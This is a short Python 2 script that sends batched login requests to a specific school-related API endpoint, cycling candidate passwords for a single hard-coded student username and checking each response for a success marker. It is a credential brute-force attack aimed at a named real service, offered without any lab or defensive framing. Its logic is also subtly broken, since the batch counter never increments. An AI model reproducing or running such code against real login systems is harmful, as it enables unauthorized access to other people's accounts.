import grequests
import itertools

def do_something(response, *args, **kwargs):
    print response

payloads = []
counter = 0
for ele in itertools.product("0123456",repeat=1):
    elements = "".join(ele)
    mayload = {'username': "512563", 'password': elements, 'role': "student"}
    print elements
    payloads.append(mayload)
    if (counter == 500):
        unsent_request = []

        for payload_single in payloads:
            unsent_request.append(grequests.post('https://api.nse.sg/accounts/login', hooks={'response': do_something}, data=payload_single))

        responses =  grequests.map(unsent_request)
        for r in responses:
            print r.text
            word = 'true'
            if word in r.text:
                break
        payloads = []
        counter = 0
        continue
